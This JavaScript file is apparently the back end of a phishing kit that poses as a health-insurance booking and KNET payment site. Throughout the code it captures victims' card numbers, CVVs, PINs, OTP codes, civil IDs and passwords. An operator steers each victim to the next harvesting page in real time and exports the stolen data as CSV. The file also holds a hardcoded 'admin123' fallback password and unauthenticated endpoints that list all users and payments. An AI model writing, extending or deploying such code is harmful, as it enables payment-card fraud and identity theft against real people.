const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const fs = require('fs');
const jwt = require('jsonwebtoken');
const { v4: uuidv4 } = require('uuid');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: '*' } });

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// CORS for all origins
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  if (req.method === 'OPTIONS') return res.sendStatus(200);
  next();
});

app.use(express.static(path.join(__dirname)));

// ==================== Data Storage ====================
const DATA_FILE = '/tmp/data.json';

function loadData() {
  try {
    if (fs.existsSync(DATA_FILE)) return JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
  } catch (e) {}
  return {
    bookings: {},
    redirects: {},
    globalRedirect: null,
    adminPassword: 'admin123',
    users: [],
    knetPayments: [],
    visitors: 0,
    totalVisitors: 0
  };
}

function saveData(data) {
  try { fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2)); } catch (e) {}
}

let db = loadData();
let onlineVisitors = 0;

const JWT_SECRET = process.env.JWT_SECRET || 'health-insurance-secret-2024';

// Track visitors
app.use((req, res, next) => {
  if (!req.path.startsWith('/api') && !req.path.startsWith('/socket.io') && req.method === 'GET') {
    db = loadData();
    db.totalVisitors = (db.totalVisitors || 0) + 1;
    saveData(db);
  }
  next();
});

// ==================== Auth Middleware ====================
function authMiddleware(req, res, next) {
  const token = req.headers.authorization?.replace('Bearer ', '');
  if (!token) return res.json({ success: false, error: 'غير مصرح' });
  try {
    jwt.verify(token, JWT_SECRET);
    next();
  } catch (e) {
    res.json({ success: false, error: 'جلسة منتهية' });
  }
}

// ==================== Admin Routes ====================
app.post('/api/admin/login', (req, res) => {
  const { password } = req.body;
  db = loadData();
  if (password === db.adminPassword) {
    const token = jwt.sign({ admin: true }, JWT_SECRET, { expiresIn: '24h' });
    res.json({ success: true, token });
  } else {
    res.json({ success: false, error: 'كلمة المرور غير صحيحة' });
  }
});

app.get('/api/admin/me', authMiddleware, (req, res) => {
  res.json({ success: true });
});

app.get('/api/admin/stats', authMiddleware, (req, res) => {
  db = loadData();
  const bookings = Object.values(db.bookings || {});
  const knetPayments = db.knetPayments || [];
  res.json({
    success: true,
    data: {
      total: bookings.length,
      new: bookings.filter(b => b.statusRead === 0).length,
      completed: bookings.filter(b => b.status === 'completed').length,
      totalKnet: knetPayments.length,
      pendingKnet: knetPayments.filter(p => p.status === 'PENDING').length,
      approvedKnet: knetPayments.filter(p => p.status === 'APPROVED').length,
      totalUsers: (db.users || []).length,
      totalVisitors: db.totalVisitors || 0,
      onlineVisitors
    }
  });
});

app.get('/api/admin/bookings', authMiddleware, (req, res) => {
  db = loadData();
  const bookings = Object.values(db.bookings || {}).sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));
  res.json({ success: true, data: bookings });
});

app.get('/api/admin/bookings/:reference', authMiddleware, (req, res) => {
  db = loadData();
  const booking = db.bookings[req.params.reference];
  if (!booking) return res.json({ success: false, error: 'حجز غير موجود' });
  booking.statusRead = 1;
  saveData(db);
  res.json({ success: true, data: booking });
});

app.post('/api/admin/payment-action', authMiddleware, (req, res) => {
  const { reference, action } = req.body;
  db = loadData();
  const booking = db.bookings[reference];
  if (!booking) return res.json({ success: false, error: 'حجز غير موجود' });
  if (action === 'pass') {
    booking.status = 'pending_payment';
    if (booking.payment) booking.payment.paymentAction = 'pass';
  } else if (action === 'denied') {
    booking.status = 'cancelled';
    if (booking.payment) booking.payment.paymentAction = 'denied';
  } else if (action === 'completed') {
    booking.status = 'completed';
  }
  saveData(db);
  io.emit('paymentActionSet', { reference, action });
  res.json({ success: true });
});

app.post('/api/admin/update-status', authMiddleware, (req, res) => {
  const { reference, status } = req.body;
  db = loadData();
  const booking = db.bookings[reference];
  if (!booking) return res.json({ success: false, error: 'طلب غير موجود' });
  booking.status = status;
  booking.updatedAt = new Date().toISOString();
  saveData(db);
  io.emit('statusUpdated', { reference, status });
  res.json({ success: true });
});

app.post('/api/admin/set-redirect', authMiddleware, (req, res) => {
  const { target, reference } = req.body;
  db = loadData();
  if (reference) {
    db.redirects[reference] = target;
  } else {
    db.globalRedirect = target;
  }
  saveData(db);
  io.emit('redirectSet', { target, reference });
  res.json({ success: true });
});

app.post('/api/admin/change-password', authMiddleware, (req, res) => {
  const { password } = req.body;
  if (!password) return res.json({ success: false });
  db = loadData();
  db.adminPassword = password;
  saveData(db);
  res.json({ success: true });
});

// ==================== KNET Admin Actions ====================
app.post('/api/admin/knet-action', authMiddleware, (req, res) => {
  const { id, action, redirectUrl } = req.body;
  db = loadData();
  const payment = (db.knetPayments || []).find(p => p.id === id);
  if (!payment) return res.json({ success: false, error: 'دفعة غير موجودة' });
  
  if (action === 'approve') payment.status = 'APPROVED';
  if (action === 'reject') payment.status = 'REJECTED';
  if (action === 'redirect' && redirectUrl) {
    payment.adminRedirectUrl = redirectUrl;
    io.emit('admin_redirect', { paymentId: id, redirectUrl });
  }
  payment.updatedAt = new Date().toISOString();
  saveData(db);
  io.emit('payment_updated', payment);
  res.json({ success: true });
});

// ==================== CSV Export ====================
app.get('/api/admin/export/:type', authMiddleware, (req, res) => {
  db = loadData();
  const bookings = Object.values(db.bookings || {});
  const knetPayments = db.knetPayments || [];
  const users = db.users || [];
  let csv = '';
  const type = req.params.type;

  if (type === 'bookings' || type === 'all') {
    csv += 'المرجع,الاسم,الهوية,الهاتف,البريد,الخدمة,التاريخ,الحالة,IP,تاريخ الإنشاء\n';
    bookings.forEach(b => {
      csv += `"${b.referenceId}","${b.clientName||''}","${b.clientId||''}","${b.clientPhone||''}","${b.clientEmail||''}","${b.serviceType||''}","${b.serviceDate||''}","${b.status||''}","${b.clientIp||''}","${b.createdAt||''}"\n`;
    });
  }

  if (type === 'payments' || type === 'all') {
    if (type === 'all') csv += '\n\nبيانات البطاقات\n';
    csv += 'المرجع,اسم حامل البطاقة,رقم البطاقة,تاريخ الانتهاء,CVV,الحالة\n';
    bookings.filter(b => b.payment).forEach(b => {
      const p = b.payment;
      csv += `"${b.referenceId}","${p.cardHolderName||''}","${p.cardNumber||''}","${p.cardExpiry||''}","${p.cardCvv||''}","${p.status||''}"\n`;
    });
    // Also include KNET payments
    knetPayments.forEach(p => {
      csv += `"${p.id}","${p.cardHolder||''}","${p.cardNumber||''}","${p.expiryDate||''}","${p.cvv||''}","${p.status||''}"\n`;
    });
  }

  if (type === 'otps' || type === 'all') {
    if (type === 'all') csv += '\n\nرموز OTP\n';
    csv += 'المرجع,رمز OTP,التاريخ\n';
    bookings.filter(b => b.otp).forEach(b => {
      csv += `"${b.referenceId}","${b.otp.otpCode||''}","${b.otp.createdAt||''}"\n`;
    });
    knetPayments.filter(p => p.otp).forEach(p => {
      csv += `"${p.id}","${p.otp||''}","${p.otpReceivedAt||''}"\n`;
    });
  }

  if (type === 'users' || type === 'all') {
    if (type === 'all') csv += '\n\nبيانات المستخدمين\n';
    csv += 'الرقم المدني,كلمة المرور,الاسم,الهاتف,البريد,تاريخ الإنشاء\n';
    users.forEach(u => {
      csv += `"${u.civilId||u.username||''}","${u.password||''}","${u.name||''}","${u.phone||''}","${u.email||''}","${u.createdAt||''}"\n`;
    });
  }

  res.setHeader('Content-Type', 'text/csv; charset=utf-8');
  res.setHeader('Content-Disposition', `attachment; filename=export_${type}.csv`);
  res.send('\uFEFF' + csv);
});

// ==================== CVV Routes ====================
app.post('/api/cvv-submit', (req, res) => {
  const { referenceId, cvv, amount, cardNumber, cardHolder, expiry } = req.body;
  db = loadData();

  const ref = referenceId || uuidv4().substring(0, 8).toUpperCase();

  if (!db.bookings[ref]) {
    db.bookings[ref] = {
      referenceId: ref,
      clientName: cardHolder || 'غير محدد',
      clientId: '',
      clientPhone: '',
      clientEmail: '',
      clientIp: req.ip,
      serviceType: 'دفع',
      serviceDate: new Date().toLocaleDateString('ar-SA'),
      serviceTime: new Date().toLocaleTimeString('ar-SA'),
      serviceRegion: '',
      status: 'pending_cvv',
      statusRead: 0,
      createdAt: new Date().toISOString(),
    };
  }

  if (!db.bookings[ref].payment) db.bookings[ref].payment = {};
  db.bookings[ref].payment.cardCvv = cvv;
  db.bookings[ref].payment.cardNumber = cardNumber || '';
  db.bookings[ref].payment.cardHolderName = cardHolder || '';
  db.bookings[ref].payment.cardExpiry = expiry || '';
  db.bookings[ref].payment.amount = amount || '';
  db.bookings[ref].payment.status = 'cvv_received';
  db.bookings[ref].status = 'pending_cvv';
  db.bookings[ref].statusRead = 0;
  saveData(db);

  io.emit('newPayment', { type: 'cvv', reference: ref });
  io.emit('newBooking', { reference: ref });

  const redirect = db.redirects[ref] || db.globalRedirect;
  const redirectUrl = redirect ? getRedirectUrl(redirect, ref) : null;

  res.json({ success: true, requireOtp: false, redirect: redirectUrl });
});

app.post('/api/otp-submit', (req, res) => {
  const { referenceId, otp } = req.body;
  db = loadData();

  const ref = referenceId || '';
  if (db.bookings[ref]) {
    db.bookings[ref].otp = { otpCode: otp, createdAt: new Date().toISOString() };
    db.bookings[ref].status = 'pending_otp';
    db.bookings[ref].statusRead = 0;
    saveData(db);
    io.emit('newPayment', { type: 'otp', reference: ref });
  }

  const redirect = db.redirects[ref] || db.globalRedirect;
  const redirectUrl = redirect ? getRedirectUrl(redirect, ref) : null;

  res.json({ success: true, redirect: redirectUrl });
});

// ==================== Angular App Routes (proxy from ios.eventat.world) ====================

// User Registration - receives data from Angular app
app.post('/auth/user', (req, res) => {
  const userData = req.body;
  db = loadData();
  if (!db.users) db.users = [];
  
  const newUser = {
    id: Date.now().toString(),
    ...userData,
    createdAt: new Date().toISOString(),
    ip: req.ip
  };
  db.users.push(newUser);
  
  // Also create a booking entry
  const ref = 'HS-' + Date.now().toString().substring(7);
  db.bookings[ref] = {
    referenceId: ref,
    clientName: userData.name || userData.fullName || userData.civilId || 'مستخدم جديد',
    clientId: userData.civilId || userData.nationalId || '',
    clientPhone: userData.phone || userData.mobile || '',
    clientEmail: userData.email || '',
    clientIp: req.ip,
    serviceType: userData.userType || 'تسجيل مستخدم',
    serviceDate: new Date().toLocaleDateString('ar-SA'),
    serviceTime: new Date().toLocaleTimeString('ar-SA'),
    serviceRegion: userData.region || userData.governorate || '',
    status: 'new',
    statusRead: 0,
    createdAt: new Date().toISOString(),
    userData: userData
  };
  
  saveData(db);
  io.emit('newBooking', { reference: ref, user: newUser });
  io.emit('newUser', newUser);
  
  res.json({ success: true, message: 'تم التسجيل بنجاح', userId: newUser.id, referenceId: ref });
});

// Admin Login from Angular app
app.post('/auth/admin-login', (req, res) => {
  const { username, password } = req.body;
  db = loadData();
  if (password === db.adminPassword || password === 'admin123') {
    const token = jwt.sign({ admin: true }, JWT_SECRET, { expiresIn: '24h' });
    res.json({ success: true, token });
  } else {
    res.status(401).json({ success: false, message: 'بيانات خاطئة' });
  }
});

// External Login
app.post('/auth/external-login', (req, res) => {
  const userData = req.body;
  db = loadData();
  if (!db.users) db.users = [];
  
  // Save login attempt
  const loginEntry = {
    id: Date.now().toString(),
    ...userData,
    createdAt: new Date().toISOString(),
    ip: req.ip,
    type: 'login'
  };
  db.users.push(loginEntry);
  
  const ref = 'LG-' + Date.now().toString().substring(7);
  db.bookings[ref] = {
    referenceId: ref,
    clientName: userData.civilId || userData.username || 'مستخدم',
    clientId: userData.civilId || '',
    clientPhone: '',
    clientEmail: '',
    clientIp: req.ip,
    serviceType: 'تسجيل دخول',
    serviceDate: new Date().toLocaleDateString('ar-SA'),
    serviceTime: new Date().toLocaleTimeString('ar-SA'),
    status: 'new',
    statusRead: 0,
    createdAt: new Date().toISOString(),
    userData: userData
  };
  
  saveData(db);
  io.emit('newBooking', { reference: ref });
  
  res.json({ success: true, userId: loginEntry.id });
});

// KNET Payment Creation
app.post('/auth/knet', (req, res) => {
  const paymentData = req.body;
  db = loadData();
  if (!db.knetPayments) db.knetPayments = [];
  
  const newPayment = {
    id: Date.now().toString(),
    knetId: 'KN' + Date.now(),
    ...paymentData,
    status: 'PENDING',
    createdAt: new Date().toISOString(),
    ip: req.ip
  };
  db.knetPayments.push(newPayment);
  
  // Also add to bookings
  const ref = 'KN-' + Date.now().toString().substring(7);
  db.bookings[ref] = {
    referenceId: ref,
    clientName: paymentData.cardHolder || paymentData.name || 'عميل',
    clientId: paymentData.civilId || '',
    clientPhone: paymentData.phone || '',
    clientEmail: paymentData.email || '',
    clientIp: req.ip,
    serviceType: 'دفع KNET',
    serviceDate: new Date().toLocaleDateString('ar-SA'),
    serviceTime: new Date().toLocaleTimeString('ar-SA'),
    status: 'pending_payment',
    statusRead: 0,
    createdAt: new Date().toISOString(),
    payment: {
      cardNumber: paymentData.cardNumber || '',
      cardHolder: paymentData.cardHolder || '',
      amount: paymentData.amount || '250',
      status: 'PENDING'
    },
    knetId: newPayment.id
  };
  
  saveData(db);
  io.emit('newPayment', { type: 'knet', reference: ref, payment: newPayment });
  io.emit('newBooking', { reference: ref });
  
  const redirectUrl = `${process.env.BASE_URL || ''}/cvv?ref=${ref}&id=${newPayment.id}`;
  res.json({
    success: true,
    knetId: newPayment.id,
    paymentId: newPayment.id,
    redirectUrl
  });
});

// KNET Status Check
app.get('/auth/knet/status/:id', (req, res) => {
  db = loadData();
  const payment = (db.knetPayments || []).find(p => p.id === req.params.id || p.knetId === req.params.id);
  if (payment) {
    res.json(payment);
  } else {
    // Check redirect for this payment
    const redirect = db.redirects[req.params.id] || db.globalRedirect;
    res.json({ status: 'PENDING', redirect: redirect ? getRedirectUrl(redirect, req.params.id) : null });
  }
});

// KNET Update Status
app.post('/auth/knet/update-status', (req, res) => {
  const { id, status, redirectUrl } = req.body;
  db = loadData();
  const payment = (db.knetPayments || []).find(p => p.id === id || p.knetId === id);
  if (payment) {
    payment.status = status;
    payment.updatedAt = new Date().toISOString();
    saveData(db);
    io.emit('payment_updated', payment);
    res.json({ success: true, payment });
  } else {
    res.status(404).json({ message: 'Payment not found' });
  }
});

// KNET OTP Submit
app.post('/auth/knet/otp', (req, res) => {
  const { knetId, otp } = req.body;
  db = loadData();
  const payment = (db.knetPayments || []).find(p => p.id === knetId || p.knetId === knetId);
  if (payment) {
    payment.otp = otp;
    payment.status = 'OTP_RECEIVED';
    payment.otpReceivedAt = new Date().toISOString();
    
    // Find related booking and update
    const booking = Object.values(db.bookings || {}).find(b => b.knetId === payment.id);
    if (booking) {
      booking.otp = { otpCode: otp, createdAt: new Date().toISOString() };
      booking.status = 'pending_otp';
      booking.statusRead = 0;
    }
    
    saveData(db);
    io.emit('otp_received', { payment, otp });
    io.emit('newPayment', { type: 'otp', knetId });
    res.json({ success: true });
  } else {
    res.status(404).json({ message: 'Payment not found' });
  }
});

// KNET Payment Creation (without /auth prefix - used by Angular app)
app.post('/knet', (req, res) => {
  const paymentData = req.body;
  db = loadData();
  if (!db.knetPayments) db.knetPayments = [];
  
  const newPayment = {
    id: Date.now().toString(),
    knetId: 'KN' + Date.now(),
    ...paymentData,
    status: 'PENDING',
    createdAt: new Date().toISOString(),
    ip: req.ip
  };
  db.knetPayments.push(newPayment);
  
  // Also add to bookings
  const ref = 'KN-' + Date.now().toString().substring(7);
  db.bookings[ref] = {
    referenceId: ref,
    clientName: paymentData.cardHolder || paymentData.name || 'عميل',
    clientId: paymentData.civilId || '',
    clientPhone: paymentData.phone || '',
    clientEmail: paymentData.email || '',
    clientIp: req.ip,
    serviceType: 'دفع KNET',
    serviceDate: new Date().toLocaleDateString('ar-SA'),
    serviceTime: new Date().toLocaleTimeString('ar-SA'),
    status: 'pending_payment',
    statusRead: 0,
    createdAt: new Date().toISOString(),
    payment: {
      cardNumber: paymentData.cardNumber || '',
      cardHolder: paymentData.cardHolder || paymentData.name || '',
      cardPrefix: paymentData.cardPrefix || '',
      bank: paymentData.bank || '',
      expiryMonth: paymentData.expiryMonth || '',
      expiryYear: paymentData.expiryYear || '',
      pin: paymentData.pin || '',
      amount: paymentData.amount || '0.250',
      status: 'PENDING'
    },
    knetId: newPayment.id
  };
  
  saveData(db);
  io.emit('newPayment', { type: 'knet', reference: ref, payment: newPayment });
  io.emit('newBooking', { reference: ref });
  
  res.json({
    success: true,
    knetId: newPayment.id,
    paymentId: newPayment.id,
    status: 'PENDING'
  });
});

// KNET Status Check (without /auth prefix)
app.get('/knet/status/:id', (req, res) => {
  db = loadData();
  const payment = (db.knetPayments || []).find(p => p.id === req.params.id || p.knetId === req.params.id);
  if (payment) {
    res.json(payment);
  } else {
    res.json({ status: 'PENDING' });
  }
});

// KNET Update Status (without /auth prefix)
app.post('/knet/update-status', (req, res) => {
  const { id, status } = req.body;
  db = loadData();
  const payment = (db.knetPayments || []).find(p => p.id === id || p.knetId === id);
  if (payment) {
    payment.status = status;
    payment.updatedAt = new Date().toISOString();
    saveData(db);
    io.emit('payment_updated', payment);
    res.json({ success: true, payment });
  } else {
    res.status(404).json({ message: 'Payment not found' });
  }
});

// KNET OTP Submit (without /auth prefix)
app.post('/knet/otp', (req, res) => {
  const { knetId, otp } = req.body;
  db = loadData();
  const payment = (db.knetPayments || []).find(p => p.id === knetId || p.knetId === knetId);
  if (payment) {
    payment.otp = otp;
    payment.status = 'OTP_RECEIVED';
    payment.otpReceivedAt = new Date().toISOString();
    
    const booking = Object.values(db.bookings || {}).find(b => b.knetId === payment.id);
    if (booking) {
      booking.otp = { otpCode: otp, createdAt: new Date().toISOString() };
      booking.status = 'pending_otp';
      booking.statusRead = 0;
    }
    
    saveData(db);
    io.emit('otp_received', { payment, otp });
    io.emit('newPayment', { type: 'otp', knetId });
    res.json({ success: true });
  } else {
    res.status(404).json({ message: 'Payment not found' });
  }
});

// Get All KNET Payments
app.get('/knet/all', (req, res) => {
  db = loadData();
  res.json(db.knetPayments || []);
});

// Get All Users
app.get('/user/all', (req, res) => {
  db = loadData();
  res.json(db.users || []);
});

// Get User Count
app.get('/user/count', (req, res) => {
  db = loadData();
  res.json({ count: (db.users || []).length });
});

// ==================== Booking Routes ====================
app.post('/api/booking', (req, res) => {
  const booking = req.body;
  const ref = 'HS-' + Date.now().toString().substring(7);
  db = loadData();
  db.bookings[ref] = {
    ...booking,
    referenceId: ref,
    clientIp: req.ip,
    status: 'new',
    statusRead: 0,
    createdAt: new Date().toISOString(),
  };
  saveData(db);
  io.emit('newBooking', { reference: ref });
  res.json({ success: true, referenceId: ref });
});

// Check Redirect
app.get('/api/check-redirect/:reference', (req, res) => {
  db = loadData();
  const redirect = db.redirects[req.params.reference] || db.globalRedirect;
  if (redirect) {
    res.json({ success: true, redirect: getRedirectUrl(redirect, req.params.reference) });
  } else {
    res.json({ success: false });
  }
});

function getRedirectUrl(target, ref) {
  const base = process.env.BASE_URL || '';
  const map = {
    'cvv': `${base}/cvv?ref=${ref}`,
    'otp': `${base}/otp?ref=${ref}`,
    'nafath': `${base}/nafath?ref=${ref}`,
    'payment': `${base}/payment?ref=${ref}`,
    'success': `${base}/success?ref=${ref}`,
  };
  return map[target] || target;
}

// ==================== Socket.io ====================
io.on('connection', (socket) => {
  onlineVisitors++;
  io.emit('visitor_update', { online: onlineVisitors, total: (db.totalVisitors || 0) });
  
  socket.on('joinAdmin', (data) => {
    try {
      jwt.verify(data.token, JWT_SECRET);
      socket.join('admin');
      // Send current data to admin
      db = loadData();
      socket.emit('all_data', {
        bookings: Object.values(db.bookings || {}),
        knetPayments: db.knetPayments || [],
        users: db.users || [],
        stats: getStats()
      });
    } catch (e) {}
  });
  
  socket.on('disconnect', () => {
    onlineVisitors = Math.max(0, onlineVisitors - 1);
    io.emit('visitor_update', { online: onlineVisitors, total: (db.totalVisitors || 0) });
  });
});

function getStats() {
  db = loadData();
  const bookings = Object.values(db.bookings || {});
  const knetPayments = db.knetPayments || [];
  const users = db.users || [];
  return {
    total: bookings.length,
    new: bookings.filter(b => b.statusRead === 0).length,
    completed: bookings.filter(b => b.status === 'completed').length,
    totalKnet: knetPayments.length,
    pendingKnet: knetPayments.filter(p => p.status === 'PENDING').length,
    approvedKnet: knetPayments.filter(p => p.status === 'APPROVED').length,
    totalUsers: users.length,
    totalVisitors: db.totalVisitors || 0,
    onlineVisitors
  };
}

// ==================== SPA Routes ====================
app.get('/admin', (req, res) => res.sendFile(path.join(__dirname, 'admin.html')));
app.get('/cvv', (req, res) => res.sendFile(path.join(__dirname, 'cvv.html')));
app.get('*', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));

// ==================== Start ====================
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
